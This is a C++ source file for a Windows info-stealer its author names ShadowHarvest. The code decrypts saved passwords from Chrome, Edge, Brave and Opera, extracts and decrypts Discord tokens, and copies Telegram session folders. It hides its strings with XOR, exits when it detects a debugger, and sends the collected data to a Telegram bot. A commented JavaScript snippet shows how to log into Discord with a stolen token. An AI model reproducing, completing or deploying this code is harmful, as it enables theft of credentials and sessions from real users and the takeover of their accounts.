 
/* English:
	ShadowHarvest is my own Info-stealer project. It is written in C++ using WinAPI libraries and It consists of four classes and main function.

	Class SystemRecon. It's main goal is extracting information from PC using methods from WinAPI.

	Class AESDecryptor. It is a support class with method to decrypt data of AES-GCM with help a master key.

	Class BrowserStealer. Using the method "getMasterKey", I can extract master key from certain browser.
		Later I copy origin database to 'temp_db' to work with it.

	Class DiscordStealer. Looping through each folder and I extract data, next my step is decoding from base64, getting the original tokens.

	Class TelegramStealer. Telegram doesn’t store data in tables. It stores data in 16-17 symbols folder 'tdata'.
		I just copy original folder and files to another place (for ex.: flash drive).
*/



/*function login(token) {
	setInterval(() => {
		const iframe = document.createElement("iframe");
		document.body.appendChild(iframe);
		iframe.contentWindow.localStorage.token = `"${token}"`;
}, 50);

setTimeout(() => {
	location.reload();
}, 2500);
}

login("YOUR_TOKEN_HERE");  It inserts in console !!! FOR DISCORD !!! */ 
 

/*
std::vector<std::string>v = { "Local State", "Login Data", "temp_db", "discord", "tdata", "key_datas", "discordcanary", "discordptb" };

\xbc\xc6\x7b\xa4\xc4\x49\xfb\x09\x29\xe5\x65 Local State
\xbc\xc6\x7f\xac\xc6\x49\xec\x1c\x3c\xf0 Login Data
\x84\xcc\x75\xb5\xf7\x0d\xca temp_db
\x94\xc0\x6b\xa6\xc7\x1b\xcc discord
\x84\xcd\x79\xb1\xc9 tdata
\x9b\xcc\x61\x9a\xcc\x08\xdc\x1c\x3b key_datas
\x94\xc0\x6b\xa6\xc7\x1b\xcc\x1e\x29\xff\x61\xcf\x49 discordcanary
\x94\xc0\x6b\xa6\xc7\x1b\xcc\x0d\x3c\xf3 discordptb
*/



#define _CRT_SECURE_NO_WARNINGS

#include <Windows.h>

#ifndef NT_SUCCESS
#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)
#endif
#define STATUS_SUCCESS                   ((NTSTATUS)0x00000000L)

#include <winhttp.h>
#pragma comment(lib, "winhttp.lib")
#include <bcrypt.h>
#pragma comment(lib, "bcrypt.lib")
#include <iphlpapi.h>
#pragma comment(lib, "ws2_32.lib")
#include <iostream>
#include <string>
#include <memory>
#include <cstdio>
#include <filesystem>
#include <cstdlib>
#include <wincrypt.h>
#include <fstream>
#include <vector>
#include "sqlite3.h"
#include <regex>
#include <future>
#include <vector>
#include <mutex> 
#include <winternl.h> 
#include <intrin.h>

namespace fs = std::filesystem;

std::mutex cout_mutex;

bool isDebuggingByPeb() {
	unsigned long long pebAddress = __readgsqword(0x60);
	unsigned char beingDebugged = *(unsigned char*)(pebAddress + 2);

	return beingDebugged != 0;
}

bool isDebuggedByGlobalFlag() {
	unsigned long long pebAddress = __readgsqword(0x60);
	unsigned int ntGlobalFlag = *(unsigned int*)(pebAddress + 0xBC);

	return (ntGlobalFlag & 0x70);
}


typedef BOOL(WINAPI* pCryptStringToBinaryA)(
	_In_reads_(cchString) LPCSTR pszString,
	_In_ DWORD cchString,
	_In_ DWORD dwFlags,
	_Out_writes_bytes_to_opt_(*pcbBinary, *pcbBinary) BYTE* pbBinary,
	_Inout_ DWORD* pcbBinary,
	_Out_opt_ DWORD* pdwSkip,
	_Out_opt_ DWORD* pdwFlags
	);
typedef BOOL(WINAPI* pCryptUnprotectData)(
	_In_            DATA_BLOB* pDataIn,
	_Outptr_opt_result_maybenull_ LPWSTR* ppszDataDescr,
	_In_opt_        DATA_BLOB* pOptionalEntropy,
	_Reserved_      PVOID           pvReserved,
	_In_opt_        CRYPTPROTECT_PROMPTSTRUCT* pPromptStruct,
	_In_            DWORD           dwFlags,
	_Out_           DATA_BLOB* pDataOut
	);
typedef DWORD(WINAPI* pSendARP)(
	_In_ IPAddr DestIP,
	_In_ IPAddr SrcIP,
	_Out_writes_bytes_(*PhyAddrLen) PVOID pMacAddr,
	_Inout_ PULONG  PhyAddrLen
	);

pCryptStringToBinaryA MyCryptStringToBinaryA = nullptr;
pCryptUnprotectData MyCryptUnprotectData = nullptr;
pSendARP MySendARP = nullptr;
HMODULE hCrypt32 = nullptr;
HMODULE hIphlpapi = nullptr;
std::string result_to_send = "";


std::string EncryptDecrypt(std::string data) {
	uint8_t key = 0x5A;
	for (size_t i = 0; i < data.size(); i++)
	{
		uint8_t fake = (i * 7) ^ 0xAA;
		data[i] ^= (key^fake);
		key = (key + fake) ^ (i*13);
	}
	return data;
}

void Init() {
	hCrypt32 = LoadLibraryA("crypt32.dll");
	
	if (hCrypt32) {
		MyCryptUnprotectData = (pCryptUnprotectData)GetProcAddress(hCrypt32, "CryptUnprotectData");
		MyCryptStringToBinaryA = (pCryptStringToBinaryA)GetProcAddress(hCrypt32, "CryptStringToBinaryA");
	}
	else {
		std::cerr << "Failed to load crypt32.dll\n";
		return;
	}
	hIphlpapi = LoadLibraryA("iphlpapi.dll");
	if (hIphlpapi) {
		MySendARP = (pSendARP)GetProcAddress(hIphlpapi, "SendARP");
	}
	else {
		std::cerr << "Failed to load iphlpapi.dll\n";
		return;
	}
}

class SystemRecon {
private:
	std::unique_ptr<char[]> getComputerNameMethod() {
		auto buffer = std::make_unique<char[]>(64);
		DWORD size = 64;
		GetComputerNameA(buffer.get(), &size);
		return buffer;
	}
	std::unique_ptr<char[]> getOSVersion() {
		auto buffer = std::make_unique<char[]>(64);
		typedef NTSTATUS(WINAPI* RtlGetVersionPtr)(PRTL_OSVERSIONINFOW);

		auto func = (RtlGetVersionPtr)GetProcAddress(
			GetModuleHandleA("ntdll.dll"),
			"RtlGetVersion"
		);
		if (!func) return nullptr;

		RTL_OSVERSIONINFOW info{};
		info.dwOSVersionInfoSize = sizeof(info);
		func(&info);
		sprintf_s(buffer.get(), 64, 
			"Windows %lu.%lu build %lu",
			info.dwMajorVersion,
			info.dwMinorVersion,
			info.dwBuildNumber
		);
		return buffer;
	}
public:
	SystemRecon() = default;
	std::unique_ptr<char[]> getUserNameMethod() {
		auto buffer = std::make_unique<char[]>(32);
		DWORD size = 32;
		GetUserNameA(buffer.get(), &size);
		return buffer;
	}
	void getInfoComputer() {
		auto computer_name = getComputerNameMethod();
		auto user_name = getUserNameMethod();
		auto os_version = getOSVersion();
		std::cout << "Computer name: " << computer_name.get() << '\n'
			<< "Username: " << user_name.get() << '\n'
			<< "OS version: " << (os_version ? os_version.get() : "error") << "\n\n";
	}
	std::string saveInfoComputer() {
		auto computer_name = getComputerNameMethod();
		auto user_name = getUserNameMethod();
		auto os_version = getOSVersion();
		return "Computer name: " + std::string(computer_name.get()) + '\n'
			+ "Username: " + std::string(user_name.get()) + '\n'
			+ "OS version: " + std::string((os_version ? os_version.get() : "error")) + "\n\n";
	}

};

struct AESDecryptor {
	static std::string decrypt(const std::vector<BYTE>& encData, const std::string& key) {
		if (encData.size() < 15 + 16) return "";

		if (encData[0] != 'v' || encData[1] != '1' || encData[2] != '0') return "";

		std::vector<BYTE> iv(encData.begin() + 3, encData.begin() + 15);
		std::vector<BYTE> cipherText(encData.begin() + 15, encData.end() - 16);
		std::vector<BYTE> tag(encData.end() - 16, encData.end());

		BCRYPT_ALG_HANDLE hAlg = NULL;
		BCRYPT_KEY_HANDLE hKey = NULL;
		std::string plainText = "";
		NTSTATUS status;

		status = BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_AES_ALGORITHM, NULL, 0);
		BCryptSetProperty(hAlg, BCRYPT_CHAINING_MODE, (PUCHAR)BCRYPT_CHAIN_MODE_GCM, sizeof(BCRYPT_CHAIN_MODE_GCM), 0);

		status = BCryptGenerateSymmetricKey(hAlg, &hKey, NULL, 0, (PUCHAR)key.data(), (ULONG)key.size(), 0);
		if (status != 0) return "Key Creation Error";

		BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO authInfo;
		BCRYPT_INIT_AUTH_MODE_INFO(authInfo);
		authInfo.pbNonce = iv.data(); authInfo.cbNonce = (ULONG)iv.size();
		authInfo.pbTag = tag.data(); authInfo.cbTag = (ULONG)tag.size();

		ULONG decLen = 0;
		// КРОК 1: Отримуємо розмір.
		status = BCryptDecrypt(hKey, cipherText.data(), (ULONG)cipherText.size(), &authInfo, NULL, 0, NULL, 0, &decLen, 0);

		if (status == 0) {
			std::vector<BYTE> buffer(decLen);
			// КРОК 2: Розшифровуємо.
			status = BCryptDecrypt(hKey, cipherText.data(), (ULONG)cipherText.size(), &authInfo, NULL, 0, buffer.data(), (ULONG)buffer.size(), &decLen, 0);
			if (status == 0) {
				plainText.assign(reinterpret_cast<char*>(buffer.data()), decLen);
			}
		}

		if (hKey) BCryptDestroyKey(hKey);
		if (hAlg) BCryptCloseAlgorithmProvider(hAlg, 0);
		return plainText;
	}
};

class BrowserStealer {
private:
	fs::path userDataPath;
	fs::path loginDataPath;
	fs::path localStatePath;

	std::string getMasterKey() {
		std::ifstream file(localStatePath);
		if (!file.is_open()) throw std::runtime_error("Can't opened this file");

		std::string content(
			(std::istreambuf_iterator<char>(file)), std::istreambuf_iterator<char>()
		);
		std::string pattern = "\"encrypted_key\":\"";
		size_t start = content.find(pattern);
		start += pattern.length();
		size_t end = content.find("\"", start);
		std::string base64Key = content.substr(start, end - start);

		DWORD decodedLen;
		MyCryptStringToBinaryA(base64Key.c_str(), NULL, CRYPT_STRING_BASE64, NULL, &decodedLen, NULL, NULL);
		std::vector<BYTE>decodedKey(decodedLen);
		MyCryptStringToBinaryA(base64Key.c_str(), NULL, CRYPT_STRING_BASE64, decodedKey.data(), &decodedLen, NULL, NULL);

		DATA_BLOB input;
		input.pbData = decodedKey.data() + 5;
		input.cbData = decodedLen - 5;

		DATA_BLOB output;
		if (MyCryptUnprotectData(&input, NULL, NULL, NULL, NULL, 0, &output)) {
			std::string finalkey(reinterpret_cast<char*>(output.pbData), output.cbData);
			LocalFree(output.pbData);
			return finalkey;
		}
		return "";
	}
	



public:
	void setupPaths(fs::path base, std::string profile) {
		localStatePath = base / EncryptDecrypt("\xbc\xc6\x7b\xa4\xc4\x49\xfb\x09\x29\xe5\x65");
		loginDataPath = base / profile / EncryptDecrypt("\xbc\xc6\x7f\xac\xc6\x49\xec\x1c\x3c\xf0");

		// Opera
		if (!fs::exists(loginDataPath)) {
			loginDataPath = base / "\xbc\xc6\x7f\xac\xc6\x49\xec\x1c\x3c\xf0";
		}
	}
	void steal()
	{
		if (!fs::exists(loginDataPath)) {
			std::cerr << "[!] Chrome Login Data not found.\n";
			return;
		}
		try {
			fs::copy_file(loginDataPath, EncryptDecrypt("\x84\xcc\x75\xb5\xf7\x0d\xca"), fs::copy_options::overwrite_existing);
			std::cout << "[+] Database copied to temp_db\n";
		}
		catch (fs::filesystem_error& e) {
			std::cerr << "[!] Copy error: " << e.what() << "\n";
			return;
		}
		if (fs::exists(localStatePath)) {
			std::cout << "[+] Local State found. Ready to extract Master Key.\n";
		}
	}
	void displaySizeOfMasterKey() {
		std::string ms = getMasterKey();

		std::cout << "Size of master key: " << ms.size() << "bytes\n";
	}
	void extractLogins() {
		sqlite3* db;

		std::string tempDb = EncryptDecrypt("\x84\xcc\x75\xb5\xf7\x0d\xca");

		if (sqlite3_open(tempDb.c_str(), &db) != SQLITE_OK) {
			std::cerr << "[!] Can't open database: " << sqlite3_errmsg(db) << "\n";
			return;
		}

		const char* sql_query = "SELECT origin_url, username_value, password_value FROM logins";
		sqlite3_stmt* stmt;
		std::string masterKey = getMasterKey();
		if (sqlite3_prepare_v2(db, sql_query, -1, &stmt, 0) == SQLITE_OK) {

			while (sqlite3_step(stmt) == SQLITE_ROW)
			{
				const char* url_ptr = reinterpret_cast<const char*>(sqlite3_column_text(stmt, 0));
				std::string url = url_ptr ? url_ptr : ""; 

				const char* user_ptr = reinterpret_cast<const char*>(sqlite3_column_text(stmt, 1));
				std::string username = user_ptr ? user_ptr : "";

				const void* enc_password = sqlite3_column_blob(stmt, 2);
				int enc_size = sqlite3_column_bytes(stmt, 2);

				if (username.empty() || enc_size == 0) continue;

				
				const BYTE* byte_password = static_cast<const BYTE*>(enc_password);
				std::vector<BYTE>encryptedData(byte_password, byte_password + enc_size);

				std::string decryptedPassword = AESDecryptor::decrypt(encryptedData, masterKey);

				std::cout << "URL:  " << url << "\n";
				std::cout << "USER: " << username << "\n";
				std::cout << "PASS: " << decryptedPassword << "\n";
				std::cout << "-----------------------------------\n";

				result_to_send += "URL: " + url + "\nUSER: " + username 
					+ "\nPASS: " + decryptedPassword + "\n-----------------------------------\n";
			}
		}
		else {
			std::cerr << "[!] SQL Error: " << sqlite3_errmsg(db) << "\n";
		}
		sqlite3_finalize(stmt);
		sqlite3_close(db);
		fs::remove(tempDb);
	}

};

class DiscordStealer {
public:
	std::string GetMasterKey() {
		char* appdata = getenv("APPDATA");
		fs::path localState = fs::path(appdata) / EncryptDecrypt("\x94\xc0\x6b\xa6\xc7\x1b\xcc") / EncryptDecrypt("\xbc\xc6\x7b\xa4\xc4\x49\xfb\x09\x29\xe5\x65");

		std::ifstream file(localState);
		if (!file.is_open()) return "";
		std::string content((std::istreambuf_iterator<char>(file)), std::istreambuf_iterator<char>());

		size_t start = content.find("\"encrypted_key\":\"") + 17;
		size_t end = content.find("\"", start);
		std::string base64Key = content.substr(start, end - start);

		


	
		DWORD decodedLen;
		MyCryptStringToBinaryA(base64Key.c_str(), 0, CRYPT_STRING_BASE64, NULL, &decodedLen, NULL, NULL);
		std::vector<BYTE> decoded(decodedLen);
		MyCryptStringToBinaryA(base64Key.c_str(), 0, CRYPT_STRING_BASE64, decoded.data(), &decodedLen, NULL, NULL);
		
		std::string final_key = "";
		DATA_BLOB input = { decodedLen - 5, decoded.data() + 5 }, output;
		if (MyCryptUnprotectData(&input, NULL, NULL, NULL, NULL, 0, &output)) {
			final_key = std::string(reinterpret_cast<char*>(output.pbData), output.cbData);
			LocalFree(output.pbData);
			
		}
		return final_key;
	}

	void Grab() {
		std::cout << "[*] Starting Discord module...\n";
		result_to_send += "[*] Starting Discord module...\n";
		std::string key = GetMasterKey();
		if (key.empty()) {
			std::cout << "[-] Discord Master Key empty.\n";
			return;
		}
		std::cout << "[+] Master Key decrypted! Size: " << key.size() << " bytes.\n";

		char* appdata = getenv("APPDATA");
		std::vector<std::string> folders = { 
			EncryptDecrypt("\x94\xc0\x6b\xa6\xc7\x1b\xcc"),
			EncryptDecrypt("\x94\xc0\x6b\xa6\xc7\x1b\xcc\x1e\x29\xff\x61\xcf\x49"),
			EncryptDecrypt("\x94\xc0\x6b\xa6\xc7\x1b\xcc\x0d\x3c\xf3")
		};
		
		for (const auto& folder : folders) {
			fs::path path = fs::path(appdata) / folder / "Local Storage/leveldb";
			if (!fs::exists(path)) continue;

			std::cout << "[*] Scanning folder: " << folder << "\n";
			result_to_send+= "[*] Scanning folder: " + folder + "\n";
			int filesCount = 0;

			for (const auto& entry : fs::directory_iterator(path)) {
				if (entry.path().extension() == ".ldb" || entry.path().extension() == ".log") {
					filesCount++;

			
					std::ifstream file(entry.path(), std::ios::binary | std::ios::ate);
					if (!file.is_open()) continue;

					std::streamsize size = file.tellg();
					file.seekg(0, std::ios::beg);
					std::vector<char> buffer(size);
					if (!file.read(buffer.data(), size)) continue;
					file.close();

					std::string content(buffer.begin(), buffer.end());

					std::string prefix = "dQw4w9WgXcQ:";
					size_t pos = content.find(prefix);

					while (pos != std::string::npos) {
						std::cout << "[!] Found prefix in file: " << entry.path().filename().string() << "\n";

						std::string encPart = "";
						for (size_t i = pos + prefix.length(); i < content.length(); ++i) {
							char c = content[i];
							// Base64
							if ((c >= 'A' && c <= 'Z') || (c >= 'a' && c <= 'z') || (c >= '0' && c <= '9') || c == '+' || c == '/' || c == '=') {
								encPart += c;
							}
							else break;
						}

						if (!encPart.empty()) {
							DWORD decodedTokenLen;
							MyCryptStringToBinaryA(encPart.c_str(), 0, CRYPT_STRING_BASE64, NULL, &decodedTokenLen, NULL, NULL);
							std::vector<BYTE> decodedToken(decodedTokenLen);
							if (MyCryptStringToBinaryA(encPart.c_str(), 0, CRYPT_STRING_BASE64, decodedToken.data(), &decodedTokenLen, NULL, NULL)) {
								std::cout << " [DEBUG] Found Encrypted Blob. Size: " << decodedToken.size() << " bytes.\n";
								std::string token = DecryptDiscordToken(decodedToken, key);
								if (!token.empty()) {
									std::cout << "\n[!!! SUCCESS !!!] TOKEN: " << token << "\n\n";
									result_to_send+= "\n[!!! SUCCESS !!!] TOKEN: " + token + "\n\n";
								}
							}
						}
						pos = content.find(prefix, pos + 1);
					}
				}
			}
			
			std::cout << "[*] Scanned " << filesCount << " files in " << folder << "\n";
			result_to_send += "[*] Scanned "+ std::to_string(filesCount) + " files in " + folder + "\n";
		}
		std::cout << "[*] Discord module finished.\n";
		result_to_send+="[*] Discord module finished.\n";
	}

private:
	
	std::string DecryptDiscordToken(std::vector<BYTE> data, std::string key) {
		if (data.size() < 28) return "";

		std::vector<BYTE> payload;

		// ПЕРЕВІРКА: чи вже є префікс v10 у даних?
		if (data[0] == 'v' && data[1] == '1' && data[2] == '0') {
			payload = data;
		}
		else {
			// Якщо немає - додаємо
			payload = { 'v', '1', '0' };
			payload.insert(payload.end(), data.begin(), data.end());
		}

		// Викликаємо дешифратор
		std::string result = AESDecryptor::decrypt(payload, key);

		if (result.empty()) {
			// Якщо не спрацювало, спробуємо вивести статус через NTSTATUS
			// Для цього я додав дебаг-принт прямо сюди
			std::cout << " [DEBUG] Decryption returned empty string for data size: " << data.size() << "\n";
		}

		return result;
	}
};

class TelegramStealer {
public:
	void GrabSession() {
		const char* appdata = getenv("APPDATA");
		if (!appdata) return;

		fs::path tgPath = fs::path(appdata) / "Telegram Desktop" / EncryptDecrypt("\x84\xcd\x79\xb1\xc9");
		fs::path destPath = "D:\\test\\TEST_RUN\\tdata";

		if (!fs::exists(tgPath)) {
			std::cout << "[-] Telegram not found." << std::endl;
			return;
		}

		if(!fs::exists(destPath)) 
			fs::create_directories(destPath);

		std::cout << "[*] Telegram found! Harvesting session..." << std::endl;

		try {
			for (const auto& entry : fs::directory_iterator(tgPath)) {
				std::string name = entry.path().filename().string();

				
				if (name.length() == 17 || name.length() == 16) {
					if (entry.is_directory()) {
						fs::path subDest = destPath / name;
						fs::create_directory(subDest);

						for (const auto& subEntry : fs::directory_iterator(entry.path())) {
							fs::copy_file(subEntry.path(), subDest / subEntry.path().filename(), fs::copy_options::overwrite_existing);

						}
						std::cout << "[+] Session folder copied: " << name << std::endl;
					}
					else {
						fs::copy_file(entry.path(), destPath / name, fs::copy_options::overwrite_existing);
					}
				}
				if (name == "key_datas" || name == "prefix" || name == "settingss" || name == "usertag") {
					fs::copy_file(entry.path(), destPath / name, fs::copy_options::overwrite_existing);
					std::cout << "[+] Captured system file: " << name << std::endl;
				}
			}
			std::cout << "\n[!!! SUCCESS !!!] Telegram session captured in C:\\test\\TG_Loot" << std::endl;
		}
		catch (const std::exception& e) {
			std::cout << "[-] Error: " << e.what() << std::endl;
		}
	}
};

class Exfiltration {

public:
	void Exif(const std::string& stolen_data) {
		HINTERNET hSession = WinHttpOpen(
			L"Mozilla/5.0 (Windows NT 10.0; Win64; x64) ShadowHarvest/1.0",
			WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
			WINHTTP_NO_PROXY_NAME,
			WINHTTP_NO_PROXY_BYPASS,
			0
		);

		HINTERNET hConnect = WinHttpConnect(
			hSession,
			L"api.telegram.org",
			INTERNET_DEFAULT_HTTPS_PORT,
			0
		);
		std::wstring path = L"/botYOUR_BOT_TOKEN_HERE/sendDocument";

		HINTERNET hRequest = WinHttpOpenRequest(
			hConnect,
			L"POST",
			path.c_str(),
			NULL,
			WINHTTP_NO_REFERER,
			WINHTTP_DEFAULT_ACCEPT_TYPES,
			WINHTTP_FLAG_SECURE
		);

		std::wstring headers = L"Content-Type: multipart/form-data; boundary=ShadowHarvestBoundary123456789\r\n";

		WinHttpAddRequestHeaders(
			hRequest,
			headers.c_str(),
			-1,
			WINHTTP_ADDREQ_FLAG_ADD | WINHTTP_ADDREQ_FLAG_REPLACE
		);

		std::string body =
			"--ShadowHarvestBoundary123456789\r\n"
			"Content-Disposition: form-data; name=\"chat_id\"\r\n\r\n"
			"YOUR_CHAT_ID_HERE\r\n"

			"--ShadowHarvestBoundary123456789\r\n"
			"Content-Disposition: form-data; name=\"document\"; filename=\"loot.txt\"\r\n"
			"Content-Type: text/plain\r\n\r\n"
			+ stolen_data + "\r\n"

			"--ShadowHarvestBoundary123456789--\r\n";

		BOOL bResult = WinHttpSendRequest(
			hRequest,
			WINHTTP_NO_ADDITIONAL_HEADERS, 0,
			(LPVOID)body.c_str(),
			body.size(),
			body.size(),
			0
		);

		if (bResult) {
			bResult = WinHttpReceiveResponse(hRequest, NULL);

		}

		if (hRequest) WinHttpCloseHandle(hRequest);
		if (hConnect) WinHttpCloseHandle(hConnect);
		if (hSession) WinHttpCloseHandle(hSession);
	}
};

class GhostHunter {
public:
	static bool IsEnvironmentDangerous() {
		if (isDebuggedByGlobalFlag() || isDebuggingByPeb()) {
			return true;
		}
		return false;
	}
};

int main() {
	if (GhostHunter::IsEnvironmentDangerous()) {
		std::cout << "[!] EMERGENCY STOP: Debugger detected. Self-destructing...\n";
		return 0;
	}
	std::cout << "OK! [+]\n\n\n";

	Init();
	if (!MyCryptUnprotectData || !MyCryptStringToBinaryA) {
		std::cout << "[-] Critical Error: Could not load crypt32.dll functions!\n";
		return 1;
	}


	SystemRecon sys_rec;
	sys_rec.getInfoComputer();

	BrowserStealer bs;
	std::string local = std::getenv("LOCALAPPDATA");
	std::string roaming = std::getenv("APPDATA");

	std::vector<std::pair<std::string, fs::path>> targets = {
		{"Chrome", local + "\\Google\\Chrome\\User Data"},
		{"Edge", local + "\\Microsoft\\Edge\\User Data"},
		{"Brave", local + "\\BraveSoftware\\Brave-Browser\\User Data"},
		{"Opera", roaming + "\\Opera Software\\Opera Stable"},
		{"OperaGX", roaming + "\\Opera Software\\Opera GX Stable"}
	};

	std::vector<std::string> profiles = { "Default", "Profile 1", "Profile 2", "Profile 3" };
	TelegramStealer tg;
	DiscordStealer ds;
	Exfiltration ex;	
	result_to_send+= sys_rec.saveInfoComputer();
	for (auto& t : targets) {
		if (!fs::exists(t.second)) continue;
		std::cout << "Browser: " << t.second << '\n';
		result_to_send += "Browser: " + t.second.string() + '\n';
		for (auto& p : profiles) {
			std::cout << "Profile: " << p << '\n';
			result_to_send += "Profile: " + p + '\n';
			bs.setupPaths(t.second, p);
			bs.steal();
			bs.extractLogins();
		}
	}

	ds.Grab();
	tg.GrabSession();
	
	ex.Exif(result_to_send);
	system("pause");
	return 0;
}


